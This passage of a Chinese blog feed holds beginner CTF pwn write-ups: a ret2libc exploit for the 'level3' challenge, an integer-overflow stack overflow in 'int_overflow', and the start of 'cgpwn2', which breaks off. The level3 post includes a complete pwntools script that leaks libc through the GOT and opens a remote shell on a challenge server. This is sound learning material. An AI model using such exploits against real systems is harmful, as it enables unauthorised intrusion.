class="line">#nctf&#123;3e1ce77b70e4cb9941d6800aec022c813d03e70a274ba96c722fed72783dddac&#125;</span><br></pre></td></tr></table></figure><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><blockquote><p>汇编有待提高，另外逆向才学习到一点皮毛！要努力了！<br><img src="https://s2.ax1x.com/2019/10/12/uXY2EF.jpg" alt="uXY2EF.jpg"></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前十多天，初学pwn，导致一直没有看逆向，而前两天遇到个VM题，一点思路没有，于是开始来学习下VMProtect；这道题终于算是有了个了解，觉得自己汇编有点差劲呢！&lt;br&gt;VMProtetct 的题太好时间了，//尽管这可能并算不上难题，因为这里面还没有垃圾代码以及多余判断，&lt;br&gt;第一次做VM，记录下&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="http://yoursite.com/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>RoarCTF</title>
    <link href="http://yoursite.com/2019/10/13/RoarCTF/"/>
    <id>http://yoursite.com/2019/10/13/RoarCTF/</id>
    <published>2019-10-13T15:34:11.000Z</published>
    <updated>2019-10-13T15:35:01.665Z</updated>
    
    <content type="html"><![CDATA[<p>太弱了！</p><a id="more"></a><h1 id="被打惨了！没心情了，额额额！"><a href="#被打惨了！没心情了，额额额！" class="headerlink" title="被打惨了！没心情了，额额额！"></a>被打惨了！没心情了，额额额！</h1><p><img src="https://s2.ax1x.com/2019/09/19/nOs2TJ.jpg" alt="nOs2TJ.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;太弱了！&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>照着ctfwiki就够了</title>
    <link href="http://yoursite.com/2019/10/11/%E7%85%A7%E7%9D%80ctfwiki%E5%B0%B1%E5%A4%9F%E4%BA%86/"/>
    <id>http://yoursite.com/2019/10/11/照着ctfwiki就够了/</id>
    <published>2019-10-11T10:44:26.000Z</published>
    <updated>2019-10-12T11:10:43.683Z</updated>
    
    <content type="html"><![CDATA[<p>早在很久前就听组长说过pwn了，但当时刚接触二进制，觉得逆向就很难入门了，一直拖到国庆节才开始学pwn，嗯…,还来的及，学就行了！</p><a id="more"></a><h1 id="一筐萝卜曰："><a href="#一筐萝卜曰：" class="headerlink" title="一筐萝卜曰："></a>一筐萝卜曰：</h1><blockquote><p>他当时也就是照ctfwiki学的，不用在网上找其它的教程之类的，这个网站的内容很优质！</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf-wiki.github.io/ctf-wiki/</span><br></pre></td></tr></table></figure><blockquote><p>但我之前看过了ctfWiki，但当时真的是看不懂，我是在网上却照着wp上学的，今天呢，又重新好好看看了ctfwiki，或许是练习十天后的结果吧，真看下去的话是能够看懂其实，（或许是之前学了段逆向的原因！理解的还算是很清晰，ctfwiki的内容确实很优质！）,以后就以这个为总线学习吧！<br>另外，刚开始的pwn中缓冲区溢出，这个链接也很优质：<a href="https://zhuanlan.zhihu.com/chaitin-tech" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/chaitin-tech</a></p></blockquote><h1 id="小结：pwn还是挺好玩的！哈哈！"><a href="#小结：pwn还是挺好玩的！哈哈！" class="headerlink" title="小结：pwn还是挺好玩的！哈哈！"></a>小结：pwn还是挺好玩的！哈哈！</h1><p><img src="https://s2.ax1x.com/2019/10/12/uXYW4J.jpg" alt="uXYW4J.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;早在很久前就听组长说过pwn了，但当时刚接触二进制，觉得逆向就很难入门了，一直拖到国庆节才开始学pwn，嗯…,还来的及，学就行了！&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>国庆七天之pwn05</title>
    <link href="http://yoursite.com/2019/10/10/%E5%9B%BD%E5%BA%86%E4%B8%83%E5%A4%A9%E4%B9%8Bpwn05/"/>
    <id>http://yoursite.com/2019/10/10/国庆七天之pwn05/</id>
    <published>2019-10-10T15:25:02.000Z</published>
    <updated>2019-10-12T10:41:43.182Z</updated>
    
    <content type="html"><![CDATA[<p>libc中的函数相对于libc的基地址的偏移都是确定的，如果有一道题给你了libc的文件，就可以通过libc文件泄露出system函数和binsh的地址，然后再构造payload。</p><a id="more"></a><h1 id="攻防世界level3"><a href="#攻防世界level3" class="headerlink" title="攻防世界level3"></a>攻防世界level3</h1><blockquote><p>参考wp：<a href="https://bbs.pediy.com/thread-254858.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-254858.htm</a></p></blockquote><p><img src="https://s2.ax1x.com/2019/10/12/uXMRbj.png" alt="uXMRbj.png"></p><blockquote><p>下载下来后是个  .gz压缩包：<br><img src="https://s2.ax1x.com/2019/10/12/uXMgKg.png" alt="uXMgKg.png"><br><img src="https://s2.ax1x.com/2019/10/12/uXM2rQ.png" alt="uXM2rQ.png"><br>tar -zxvf level3.gz</p></blockquote><blockquote><p>Linux下的解压命令具体详见：<a href="https://www.cnblogs.com/midiyu/p/7875462.html" target="_blank" rel="noopener">https://www.cnblogs.com/midiyu/p/7875462.html</a></p></blockquote><h2 id="检查文件属性以及保护模式："><a href="#检查文件属性以及保护模式：" class="headerlink" title="检查文件属性以及保护模式："></a>检查文件属性以及保护模式：</h2><p><img src="https://s2.ax1x.com/2019/10/12/uXMfVs.png" alt="uXMfVs.png"></p><blockquote><p>简单执行下：<br><img src="https://s2.ax1x.com/2019/10/12/uXMhan.png" alt="uXMhan.png"></p></blockquote><h2 id="拖入IDA分析："><a href="#拖入IDA分析：" class="headerlink" title="拖入IDA分析："></a>拖入IDA分析：</h2><blockquote><p>首先查看字符串，之前已经说过这部对于我们信息采集很重要！，只有read和write，但没有看到system和bin/sh/<br><img src="https://s2.ax1x.com/2019/10/12/uXMIP0.png" alt="uXMIP0.png"></p></blockquote><h2 id="进入main函数："><a href="#进入main函数：" class="headerlink" title="进入main函数："></a>进入main函数：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();                        // 进去分析下</span><br><span class="line">  write(1, &quot;Hello, World!\n&quot;, 0xEu);            // 0xE   14</span><br><span class="line">  return 0;</span><br><span class="line">&#125;//没有什么可疑的漏洞！</span><br></pre></td></tr></table></figure><h2 id="双击进入分析-vulnerable-function"><a href="#双击进入分析-vulnerable-function" class="headerlink" title="双击进入分析 vulnerable_function()"></a>双击进入分析 vulnerable_function()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">  write(1, &quot;Input:\n&quot;, 7u);                     // 交互  1   输入字符串到 *buf指针处</span><br><span class="line">  return read(0, &amp;buf, 0x100u);                 // 最大空间是0x88字节   但最大可以读取  0x100字节</span><br><span class="line">&#125; </span><br><span class="line">//OK，这里就是漏洞存在点了，缓冲区溢出！</span><br></pre></td></tr></table></figure><blockquote><p>有个清晰的思路，对于知识的而掌握会更加深刻，以后要在这方面多用点心！</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">因为是system函数和 bin/ sh/在程序之外的libc_32.so.6库中！</span><br><span class="line">而我们的目标是执行 system(bin/sh/)</span><br><span class="line">达到我们的目标我们首先要 得到 system()函数和bin/sh/符号在运行时在内存中的地址！</span><br><span class="line"></span><br><span class="line">libc中的函数相对于libc的基地址的偏移都是确定的，如果有一道题给你了libc的文件，</span><br><span class="line">就可以通过libc文件泄露出system函数和binsh的地址，然后再构造payload。</span><br></pre></td></tr></table></figure><ul><li>system函数在内存中的地址    =   libc_base_addr +system_libc_addr</li><li>bin/sh/符号在内存中的地址    =   libc_base_addr + binsh_libc_addr</li></ul><blockquote><p>以上呢，libc_base_addr和binsh_libc_addr我们是未知的，<br>于是我们需要做的就是  得到libc_base_addr   和 binsh_libc_addr</p></blockquote><h2 id="binsh在libc中的地址："><a href="#binsh在libc中的地址：" class="headerlink" title="binsh在libc中的地址："></a>binsh在libc中的地址：</h2><ol><li>可以直接搜索得到 binsh_libc = libc.search(‘/bin/sh’).next()</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log=&apos;debug&apos;</span><br><span class="line">libc=ELF(&apos;./libc_32.so.6&apos;)</span><br><span class="line">binsh_libc_addr=libc.search(&apos;/bin/sh&apos;).next()</span><br><span class="line">print &quot;%x&quot; %binsh_libc_addr</span><br><span class="line">print hex(binsh_libc_addr)</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/10/12/uXMoGV.png" alt="uXMoGV.png"><br>2. strings -a -t x libc_32.so.6 | grep “/bin/sh”<br><img src="https://s2.ax1x.com/2019/10/12/uXMbMF.png" alt="uXMbMF.png"></p><h2 id="libc-base-addr（libc基地址在真实内存中的地址）："><a href="#libc-base-addr（libc基地址在真实内存中的地址）：" class="headerlink" title="libc_base_addr（libc基地址在真实内存中的地址）："></a>libc_base_addr（libc基地址在真实内存中的地址）：</h2><blockquote><p>我们可以通过write_got_addr（write函数在got表中的真实（内存）的地址leak出来） - libc.symbols[‘write’]（write函数地址在libc中的偏移量）获得</p></blockquote><blockquote><p>而libc.symbols[‘write’]（write函数地址在libc中的偏移量），我们可以使用ELF模块的symbols成员函数获得，所以我们主要 向下如何获得write_got_addr（write函数在got表中的真实（内存）的地址leak出来）：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">详细参考这个链接：</span><br><span class="line">通过给的libc泄露（write_got_addr）函数在真实内存的地址：https://blog.csdn.net/zszcr/article/details/79659453</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/10/12/uXMT2T.png" alt="uXMT2T.png"></p><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><blockquote><p>于是我们刚好可以通过  vulnerable_function()函数中的buf缓冲区来得到write_got_addr，但我们好像没办法执行系统函数system(bin/sh/)了，<br>我们做pwn中缓冲区溢出漏洞，一般思路就是要覆盖返回地址，然后让他们去执行我们向栈中的shellcode，但因为这个程序开启了 NX保护，于是shellcode方法，就行不通了，我们通过return2libc来绕过！我们构造pay1时将函数返回地址继续返回到  能再次执行带write()函数的地址（这里取了main()函数，我试了下，取 vulnerable_function()也可以的），即我们在得到write_got_addr的同时又可以重新利用这个缓冲区漏洞，构造payload2system(bin/sh/)函数去执行，即制造 2次攻击！<br><img src="https://s2.ax1x.com/2019/10/12/uXMT2T.png" alt="uXMT2T.png"></p></blockquote><h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf8</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">#sh=process(&apos;./level3&apos;)</span><br><span class="line">sh=remote(&apos;111.198.29.45&apos;,&apos;56479&apos;)</span><br><span class="line">elf=ELF(&apos;./level3&apos;)</span><br><span class="line">libc=ELF(&apos;./libc_32.so.6&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#使用ELF模块的成员函数来获得write（）在程序内GOT地址和Vulnerable——function（）调用地址</span><br><span class="line">write_plt=elf.plt[&apos;write&apos;]</span><br><span class="line">#print(&apos;%x&apos; %write_plt)</span><br><span class="line">write_got=elf.got[&apos;write&apos;]</span><br><span class="line">#print(&apos;%x&apos; %write_got)</span><br><span class="line">vulnerable_function_addr=elf.symbols[&apos;main&apos;]</span><br><span class="line">#print(&apos;%x&apos; %main_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#payload = &apos;A&apos;*0x88 + p32(0xdeadbeef) + p32(write_plt) + p32(vulnerable_function_addr) + p32(1) + p32(write_got) + p32(0xdeadbeef)</span><br><span class="line"> </span><br><span class="line">payload = &apos;A&apos;*0x88 + p32(0xdeadbeef) + p32(write_plt) + p32(vulnerable_function_addr) + p32(1) + p32(write_got) + p32(0x4)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&quot;Input:\n&quot;,payload)</span><br><span class="line"> </span><br><span class="line">#leak write&apos;s addr in got</span><br><span class="line">#write_got_addr = u32(sh.recv()[:4])</span><br><span class="line">write_got_addr = u32(sh.recv(4))</span><br><span class="line">print &apos;write_got address is&apos;,hex(write_got_addr)</span><br><span class="line"> </span><br><span class="line">#leak libc&apos;s addr</span><br><span class="line">libc_addr = write_got_addr - libc.symbols[&apos;write&apos;]</span><br><span class="line">print &apos;libc address is&apos;,hex(libc_addr)</span><br><span class="line"> </span><br><span class="line">#get system&apos;s addr</span><br><span class="line">sys_addr = libc_addr + libc.symbols[&apos;system&apos;]</span><br><span class="line">print &apos;system address is&apos;,hex(sys_addr)</span><br><span class="line"> </span><br><span class="line">#get bin/sh &apos;s addr    strings -a -t x libc_32.so.6 | grep &quot;/bin/sh&quot;</span><br><span class="line">#libc.search(&quot;/bin/sh&quot;).next()</span><br><span class="line">bin_sh_addr = libc_addr + 0x15902b</span><br><span class="line">print &apos;/bin/sh address is&apos;,hex(bin_sh_addr)</span><br><span class="line"> </span><br><span class="line">#get second payload</span><br><span class="line">payload0 = &apos;A&apos;*0x88 + p32(0xdeadbeef) + p32(sys_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)</span><br><span class="line"> </span><br><span class="line">sh.sendline(payload0)</span><br><span class="line">sh.interactive()</span><br><span class="line">conn.recvall()#cyberpeace&#123;b033002e1b7fe92a83247b96ec733d1d&#125;</span><br></pre></td></tr></table></figure><h3 id="PLT与GOT的相关链接学习"><a href="#PLT与GOT的相关链接学习" class="headerlink" title="PLT与GOT的相关链接学习:"></a>PLT与GOT的相关链接学习:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/linyt/article/details/51635768</span><br><span class="line">https://blog.csdn.net/qq_18661257/article/details/54694748</span><br><span class="line">https://delcoding.github.io/2018/11/got-plt-study/</span><br><span class="line">https://tinylab.gitbooks.io/cbook/zh/chapters/02-chapter4.html</span><br></pre></td></tr></table></figure><h3 id="参考wp："><a href="#参考wp：" class="headerlink" title="参考wp："></a>参考wp：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/tiumo/p/11484755.html</span><br><span class="line">http://www.ctf-wp.com/2019/06/19/%E7%AC%AC%E5%8D%81%E4%B8%80%E9%A2%98%EF%BC%9Alevel3/</span><br><span class="line">http://winny.work/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/377.html#toc-head-11</span><br><span class="line">http://virgin-forest.top/2019/05/19/ctf-xman-level3-elf/#more</span><br><span class="line">http://www.voidcn.com/article/p-efegxkkx-byy.html</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><blockquote><p>终于做完了，觉得这11道pwn新手题中，就数这题最麻烦，当然对于我这样新手菜鸡来说！慢慢来嘛！学习这东西，急不得的！，慢慢成长！</p></blockquote><p><a href="https://imgchr.com/i/uXYhC9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/12/uXYhC9.png" alt="uXYhC9.png"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;libc中的函数相对于libc的基地址的偏移都是确定的，如果有一道题给你了libc的文件，就可以通过libc文件泄露出system函数和binsh的地址，然后再构造payload。&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>国庆七天之pwn04</title>
    <link href="http://yoursite.com/2019/10/09/%E5%9B%BD%E5%BA%86%E4%B8%83%E5%A4%A9%E4%B9%8Bpwn04/"/>
    <id>http://yoursite.com/2019/10/09/国庆七天之pwn04/</id>
    <published>2019-10-09T15:57:25.000Z</published>
    <updated>2019-10-10T17:07:48.591Z</updated>
    
    <content type="html"><![CDATA[<p>新手区的pwn题还没有做完！明天要做完它！</p><a id="more"></a><h1 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h1><h2 id="检查文件属性及其保护："><a href="#检查文件属性及其保护：" class="headerlink" title="检查文件属性及其保护："></a>检查文件属性及其保护：</h2><blockquote><p>没有canary（栈），没有PIE（地址随机化）。<br><img src="https://s2.ax1x.com/2019/10/11/u7hJ6e.png" alt="u7hJ6e.png"></p></blockquote><h2 id="ida查看字符串"><a href="#ida查看字符串" class="headerlink" title="ida查看字符串"></a>ida查看字符串</h2><blockquote><p>我觉得这步真的挺重要得！留一下可能存在漏洞所在地方或者猜测下漏洞类型！<br><img src="https://s2.ax1x.com/2019/10/11/u7hlY6.png" alt="u7hlY6.png"></p></blockquote><h2 id="main-函数："><a href="#main-函数：" class="headerlink" title="main()函数："></a>main()函数：</h2><blockquote><p>流程很简单！（详见注释）</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  setbuf(stdin, 0);</span><br><span class="line">  setbuf(stdout, 0);</span><br><span class="line">  setbuf(stderr, 0);</span><br><span class="line">  puts(&quot;---------------------&quot;);</span><br><span class="line">  puts(&quot;~~ Welcome to CTF! ~~&quot;);</span><br><span class="line">  puts(&quot;       1.Login       &quot;);</span><br><span class="line">  puts(&quot;       2.Exit        &quot;);</span><br><span class="line">  puts(&quot;---------------------&quot;);</span><br><span class="line">  printf(&quot;Your choice:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v4);                    // 交互1     选择 Login（1） 或者   Exit（2）</span><br><span class="line">  if ( v4 == 1 )                                // 肯定输入  1 啊</span><br><span class="line">  &#123;</span><br><span class="line">    login();</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v4 == 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;Bye~&quot;);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;Invalid Choice!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>main()函数中没有漏洞，肯定是在  login()函数中了!我们进去分析！</p></blockquote><h2 id="login-函数："><a href="#login-函数：" class="headerlink" title="login()函数："></a>login()函数：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">login()函数</span><br><span class="line">char *login()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-228h]</span><br><span class="line">  char s; // [esp+200h] [ebp-28h]</span><br><span class="line"></span><br><span class="line">  memset(&amp;s, 0, 0x20u);</span><br><span class="line">  memset(&amp;buf, 0, 0x200u);</span><br><span class="line">  puts(&quot;Please input your username:&quot;);          // 交互 2  输入用户名到&amp;s处（0x19）</span><br><span class="line">  read(0, &amp;s, 0x19u);</span><br><span class="line">  printf(&quot;Hello %s\n&quot;, &amp;s);</span><br><span class="line">  puts(&quot;Please input your passwd:&quot;);            // 交互  3  输入我们的密码  &amp;buf 处（0x199）</span><br><span class="line">  read(0, &amp;buf, 0x199u);                        // 留意下，0x199字节 空间 大的让人怀疑</span><br><span class="line">  return check_passwd(&amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>然后我们进去check_passwd(&amp;buf)看下，然后再综合分析！</p></blockquote><h2 id="check-passwd-amp-buf-函数："><a href="#check-passwd-amp-buf-函数：" class="headerlink" title="check_passwd(&amp;buf)函数："></a>check_passwd(&amp;buf)函数：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// 参数char *s 是 我们输入的Password字符串的指针</span><br><span class="line">char *__cdecl check_passwd(char *s)</span><br><span class="line">&#123;</span><br><span class="line">  char *result; // eax</span><br><span class="line">  char dest; // [esp+4h] [ebp-14h]</span><br><span class="line">  unsigned __int8 v3; // [esp+Fh] [ebp-9h] v3 为无符号8(n)位整形数据，范围为：0-255，若大于255，取其2的8(n)模幂，类似与在0-255 中循环</span><br><span class="line"></span><br><span class="line">  v3 = strlen(s);                               // v3 是我们输入Password的长度</span><br><span class="line">  if ( v3 &lt;= 3u || v3 &gt; 8u )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Invalid Password&quot;);</span><br><span class="line">    result = (char *)fflush(stdout);</span><br><span class="line">  &#125;</span><br><span class="line">  else                                          // 3&lt;len(Password)&lt;=8  绕过if  进入 else</span><br><span class="line">  &#123;                                             // 存在整数溢出： 3+256*x------8+256*x也可以</span><br><span class="line">    puts(&quot;Success&quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    result = strcpy(&amp;dest, s);                  // 将Password 字符串 拷贝到  &amp;dest 地址</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>因为题目，是int_overflow，所以肯定就涉及到了整数溢出漏洞！见注释；</p></blockquote><blockquote><p>另外，我参考了这个 链接：<a href="https://en.m.wikipedia.org/wiki/Integer_overflow" target="_blank" rel="noopener">https://en.m.wikipedia.org/wiki/Integer_overflow</a><br>然后我们在栈中看下 dest得在栈中得结构及所占空间大小    </p></blockquote><h2 id="dest在堆栈的数据结构（空间）：0x14字节！"><a href="#dest在堆栈的数据结构（空间）：0x14字节！" class="headerlink" title="dest在堆栈的数据结构（空间）：0x14字节！"></a>dest在堆栈的数据结构（空间）：0x14字节！</h2><p><img src="https://s2.ax1x.com/2019/10/11/u7hQFx.png" alt="u7hQFx.png"></p><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><blockquote><p>根据8位无符号整数溢出漏洞，3&lt;len(Password)&lt;=8，亦可以是259&lt;len(Password)&lt;=264<br>想要覆盖到返回地址，先使用0x14 个数据覆盖stack拷贝的passed的内存区域，然后使用4字节数据覆盖ebp，再使用”cat flag”的地址覆盖返回地址，最后接上259-0x14-4-4&lt;len(Password)&lt;=264-0x14-4-4    231&lt;x&lt;=236剩余的数据即可。这里随便去了一个   235<br>构造exp：</p></blockquote><p><img src="https://s2.ax1x.com/2019/10/11/u7hKT1.png" alt="u7hKT1.png"></p><p><img src="https://s2.ax1x.com/2019/10/11/u7h8SO.png" alt="u7h8SO.png"></p><h1 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h1><h2 id="查看属性及其文件保护："><a href="#查看属性及其文件保护：" class="headerlink" title="查看属性及其文件保护："></a>查看属性及其文件保护：</h2><blockquote><blockquote><p>没有canary（栈），没有PIE（地址随机化）。<br><img src="https://s2.ax1x.com/2019/10/11/u7h1fK.png" alt="u7h1fK.png"></p></blockquote></blockquote><h2 id="ida-查看字符串："><a href="#ida-查看字符串：" class="headerlink" title="ida 查看字符串："></a>ida 查看字符串：</h2><blockquote><p>留意漏洞可能在的地方<br><img src="https://s2.ax1x.com/2019/10/11/u7hGlD.png" alt="u7hGlD.png"></p></blockquote><h2 id="进入main-函数："><a href="#进入main-函数：" class="headerlink" title="进入main()函数："></a>进入main()函数：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setbuf(stdin, 0);</span><br><span class="line">  setbuf(stdout, 0);</span><br><span class="line">  setbuf(stderr, 0);</span><br><span class="line">  hello();</span><br><span class="line">  puts(&quot;thank you&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里没有什么，我们进入hello()函数</p></blockquote><h2 id="hello-函数"><a href="#hello-函数" class="headerlink" title="hello()函数"></a>hello()函数</h2><blockquote><p>详见注释：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">char *hello()</span><br><span class="line">&#123;</span><br><span class="line">  char *v0; // eax</span><br><span class="line">  signed int v1; // ebx</span><br><span class="line">  unsigned int v2; // ecx</span><br><span class="line">  char *v3; // eax</span><br><span class="line">  char s; // [esp+12h] [ebp-26h]</span><br><span class="line">  int v6; // [esp+14h] [ebp-24h]</span><br><span class="line"></span><br><span class="line">  v0 = &amp;s;//我们可以看到if判断上面的这些其实对我们没有影响，不用去分析这些！</span><br><span class="line">  v1 = 30;</span><br><span class="line">  if ( (unsigned int)&amp;s &amp; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)&amp;s = 0;</span><br><span class="line">    v0 = (char *)&amp;v6;</span><br><span class="line">    v1 = 28;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = 0;</span><br><span class="line">  do</span><br><span 